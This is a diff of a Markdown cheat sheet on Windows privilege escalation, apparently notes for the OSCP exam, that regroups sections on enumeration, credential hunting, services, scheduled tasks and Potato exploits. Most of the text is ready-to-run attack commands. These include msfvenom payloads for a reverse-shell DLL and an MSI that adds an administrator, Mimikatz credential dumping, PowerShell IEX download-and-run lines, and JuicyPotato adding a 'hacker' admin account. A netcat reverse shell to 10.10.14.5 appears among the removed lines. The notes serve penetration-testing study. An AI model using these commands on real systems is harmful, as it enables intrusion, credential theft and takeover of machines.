@@ -1,4 +1,35 @@
-# Windows Privilege Escalation
+# Automated Enumeration
+
+## PrivescCheck (Source)
+```
+https://github.com/itm4n/PrivescCheck
+```
+Supposedly cleaner output than WinPEAS
+
+## WinPEAS
+```
+https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+```
+Fundamental for OSCP. Always run and read output thoroughly.
+
+## PowerShell Tee 
+Useful for running WinPEAS -- writes output to file while allowing real-time review.
+```powershell
+| Tee-Object -FilePath "output.txt"
+```
+# Helpers
+Somewhere in between manual and automated tooling.
+## PowerUp.ps1
+```
+https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+```
+
+## PowerUp AllChecks
+```powershell
+Invoke-AllChecks
+```
+
+# Manual Context Gathering
 
 ## Display current user and all privileges
 ```cmd
@@ -16,32 +47,21 @@ net user administrator
 ```
 
 ## List all local groups
-```powershell
+``` cmd
 net localgroup
+```
+## List all local groups
+```powershell
 Get-LocalGroup
 ```
 
 ## List members of Administrators group
-```powershell
+```cmd
 net localgroup Administrators
+```
+## List members of Administrators group
+```powershell
 Get-LocalGroupMember Administrators
-```
-
-## List members of Remote Desktop Users group
-```powershell
-net localgroup "Remote Desktop Users"
-Get-LocalGroupMember "Remote Desktop Users"
-```
-
-## List members of Backup Operators group
-```powershell
-net localgroup "Backup Operators"
-Get-LocalGroupMember "Backup Operators"
-```
-
-## Determine if running in PowerShell or CMD
-```powershell
-(dir2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
 ## Display system information
@@ -64,10 +84,8 @@ route print
 netstat -ano
 ```
 
-## PowerShell Find Secrets
-```powershell
-Get-ChildItem -Path C:\Users -Include *.txt,*password*,*cred*,*vnc* -Recurse -Force -ErrorAction SilentlyContinue
-```
+## Check C:\
+Look for unusual folders under C:\ and C:\Temp.
 
 ## List installed programs from 32-bit registry
 ```powershell
@@ -82,6 +100,10 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
 ## List all running processes
 ```powershell
 Get-Process
+```
+
+## List all running processes
+```cmd
 tasklist /v
 ```
 
@@ -91,9 +113,17 @@ Get-WmiObject Win32_Process | Select-Object ProcessId,Name,CommandLine
 wmic process get name,processid,commandline
 ```
 
-## Display current user privileges
+# Credential Hunting
+
+## LaZagne
+Automated tool for finding insecurely cached credentials.
+```
+https://github.com/AlessandroZ/LaZagne
+```
+
+## PowerShell Get-ChildItem Credential Hunting
 ```powershell
-whoami /priv
+Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
 ```
 
 ## Get PowerShell command history
@@ -104,149 +134,20 @@ Get-History
 ## Get PSReadline history file path
 ```powershell
 (Get-PSReadlineOption).HistorySavePath
-cat (Get-PSReadlineOption).HistorySavePath
 ```
 
 ## Find PSReadline history for all users
 ```powershell
 Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
 ```
-
-## Tee WinPEAS.ps1 
-```powershell
-.\winPEAS.ps1 | Tee-Object -FilePath "winpeas_output.txt"
-```
-
-## Download and run PowerUp.ps1
-https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
-
-## Copy PowerUp from Kali and import
-```powershell
-cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .
-Import-Module .\PowerUp.ps1
-Invoke-AllChecks
-```
-
-## Run Windows Exploit Suggester on Kali
-```bash
-systeminfo > systeminfo.txt
-python3 /opt/wesng/wes.py systeminfo.txt
-```
-
-## List all services
-```powershell
-sc query state=all
-Get-Service
-```
-
-## Check service permissions with icacls
-```powershell
-icacls "C:\Program Files\Service\service.exe"
-```
-
-## List services with full path
-```powershell
-Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'}
-wmic service get name,displayname,pathname,startmode
-```
-
-## Find unquoted service paths with spaces
+## Check for auto-login credentials in registry
 ```cmd
-wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 ```
-
-## Find unquoted service paths with PowerShell
-```powershell
-Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select-Object Name,PathName,StartMode
-```
-
-## Find unquoted services with PowerUp
-```powershell
-Get-UnquotedService
-Write-ServiceBinary
-```
-
-## Find modifiable service binaries with PowerUp
-Upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
-```
-. .\PowerUp.ps1
-Get-ModifiableServiceFile
-```
-
-## Replace service binary with malicious executable
-```cmd
-icacls "C:\Program Files\Service\service.exe"
-copy evil.exe "C:\Program Files\Service\service.exe"
-```
-
-## Stop and start service for exploitation
-```cmd
-net stop ServiceName
-net start ServiceName
-sc stop ServiceName
-sc start ServiceName
-```
-
-## Create malicious DLL with msfvenom
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > evil.dll
-```
-
-## List all scheduled tasks
-```powershell
-schtasks /query /fo LIST /v
-Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
-```
-
-## Find writable scheduled task binaries
-```cmd
-schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
-```
-
-## Check for AlwaysInstallElevated registry keys
-```cmd
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-```
-
-## Create MSI payload for AlwaysInstallElevated
-```bash
-msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi > evil.msi
-```
-
-## Install malicious MSI silently
-```cmd
-msiexec /quiet /qn /i evil.msi
-```
-
-## Check registry autoruns
-```cmd
-reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-```
-
-## Check startup folder permissions
-```powershell
-icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-```
-
-## Search for password files
-```cmd
-dir /s *password*
-dir /s *cred*
-dir /s *vnc*
-dir /s *.config
-```
-
 ## Search for VNC passwords in registry
 ```cmd
 reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v password
 reg query HKLM\SOFTWARE\TightVNC\Server
-```
-
-## Check for auto-login credentials in registry
-```cmd
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 ```
 
 ## List saved credentials
@@ -254,6 +155,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 cmdkey /list
 ```
 
+# Credential Harvesting (Requires local admin)
 ## Run Mimikatz to extract logon passwords
 ```cmd
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
@@ -285,22 +187,123 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
 ```
 
-## Check for SeImpersonatePrivilege or SeAssignPrimaryToken
+# Service Enumeration
+## List all services
+```powershell
+Get-Service
+```
+
+## List all services
 ```cmd
-whoami /priv | findstr "SeImpersonate"
-whoami /priv | findstr "SeAssignPrimaryToken"
+sc query state=all
+```
+
+## List services with full path
+```powershell
+Get-WmiObject win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'}
+wmic service get name,displayname,pathname,startmode
+```
+
+## Find unquoted service paths with spaces
+```cmd
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+## Find unquoted service paths 
+```powershell
+Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select-Object Name,PathName,StartMode
+```
+
+## Find unquoted services with PowerUp
+```powershell
+Get-UnquotedService
+```
+
+## Find modifiable service binaries with PowerUp
+```
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+```
+
+## PowerUp Write-ServiceBinary
+```
+Write-ServiceBinary
+```
+
+Start/stop a service, foo, to replace its binary with a malicious one
+`net stop foo`
+`net start foo`
+
+# DLL Hijacking
+## Create malicious DLL with msfvenom
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll > evil.dll
+```
+
+# Scheduled Tasks
+## List all scheduled tasks
+```powershell
+schtasks /query /fo LIST /v
+Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath
+```
+
+## Find writable scheduled task binaries
+```cmd
+schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
+```
+
+## Check for AlwaysInstallElevated registry keys
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+## Create MSI payload for AlwaysInstallElevated
+```bash
+msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi > evil.msi
+```
+
+## Install MSI silently
+```cmd
+msiexec /quiet /qn /i evil.msi
+```
+
+## Check registry autoruns
+```cmd
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+
+## Check startup folder permissions
+```powershell
+icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+
+
+# User Account Privileges
+- SeImpersonatePrivilege or SeAssignPrimaryToken
+	- If we have either of these privileges, refer to the Potato exploit series: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
+	- Try Sweet Potato first (stabler than GodPotato)
+
+## SweetPotato (Source)
+```
+https://github.com/CCob/SweetPotato
 ```
 
 ## Run SweetPotato for privilege escalation
 ```cmd
 .\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"
-.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add && net localgroup administrators hacker /add"
+```
+
+
+## PrintSpoofer (Source)
+```
+https://github.com/itm4n/PrintSpoofer
 ```
 
 ## Run PrintSpoofer for Windows Server 2016/2019
 ```cmd
-.\PrintSpoofer64.exe -i -c cmd
-.\PrintSpoofer64.exe -c "nc.exe 10.10.14.5 4444 -e cmd.exe"
+.\PrintSpoofer64.exe -i -c "whoami"
 ```
 
 ## Run JuicyPotato for older Windows versions
@@ -309,31 +312,7 @@ whoami /priv | findstr "SeAssignPrimaryToken"
 .\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123! /add" -t *
 ```
 
-## Download PowerView for AD enumeration
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
-```
-
-## Get domain information with PowerView
-```powershell
-Get-Domain
-Get-DomainUser
-Get-DomainGroup
-Get-DomainComputer
-```
-
-## Run SharpHound for BloodHound data collection
-```cmd
-.\SharpHound.exe -c All
-.\SharpHound.exe -c All -d domain.local
-```
-
-## Run bloodhound-python from attacker machine
-```bash
-bloodhound-python -d domain.local -u username -p password -gc $IP -c all
-```
-
-## Add new local administrator user
+## Create new local administrator
 ```cmd
 net user Administrator2 Password123! /add
 net localgroup administrators Administrator2 /add
@@ -463,7 +442,6 @@ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s
 ### Useful PowerShell Tools
 
 **PowerUp.ps1** - Privilege escalation enumeration
-**PowerView.ps1** - Active Directory enumeration
 **Sherlock.ps1** - Exploit suggester
 **Invoke-Mimikatz.ps1** - Credential dumping
 
